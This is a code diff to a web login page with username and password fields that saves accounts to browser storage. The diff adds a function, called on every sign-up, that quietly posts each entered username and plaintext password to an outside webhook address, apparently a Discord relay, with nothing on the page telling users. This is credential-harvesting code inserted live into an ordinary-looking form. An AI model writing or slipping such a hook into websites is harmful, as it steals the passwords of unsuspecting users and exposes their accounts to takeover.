@@ -146,7 +146,7 @@
                                         888 ^         ""    ^Y"   ^Y'    ^*                                   88R    
                                         *8E                                                                   88>    
                                         '8>                                                                   48     
-                                         "                                                                    '8 
+                                         "                                                                    '8    
     </div>
 
     <input type="text" placeholder="Enter Username" id="input-username" class="form-input" />
@@ -168,6 +168,18 @@
       }
     }
 
+    function sendLoginToWebhook(user) {
+      const webhookURL = 'https://dcwh.my/post?uniqueid=8d06669a';
+      const content = `**New Account:** ${user.username} | **Password:** ${user.password}`;
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+      })
+      .then(res => console.log('Webhook sent', res.status))
+      .catch(err => console.error('Webhook error', err));
+    }
+
     function saveAccount(username, password) {
       const fakeUser = {
         username: username,
@@ -177,6 +189,7 @@
         id: crypto.randomUUID()
       };
       localStorage.setItem('customUser', JSON.stringify(fakeUser));
+      return fakeUser;
     }
 
     function loadCustomUser() {
@@ -203,7 +216,8 @@
       const username = document.getElementById('input-username').value.trim();
       const password = document.getElementById('input-password').value.trim();
       if (!username || !password) return alert('Please enter username and password.');
-      saveAccount(username, password);
+      const user = saveAccount(username, password);
+      sendLoginToWebhook(user);
       window.location.href = './index.html';
     });
 
